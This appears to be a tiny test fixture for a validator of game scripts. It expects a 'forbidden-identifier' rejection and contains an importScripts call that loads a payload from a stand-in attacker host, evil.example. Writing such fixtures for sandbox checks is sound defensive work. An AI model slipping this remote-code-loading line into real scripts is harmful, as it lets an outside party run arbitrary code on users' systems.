// expect: static forbidden-identifier
importScripts('https://evil.example/payload.js');
game.on('tick', () => game.score(1));
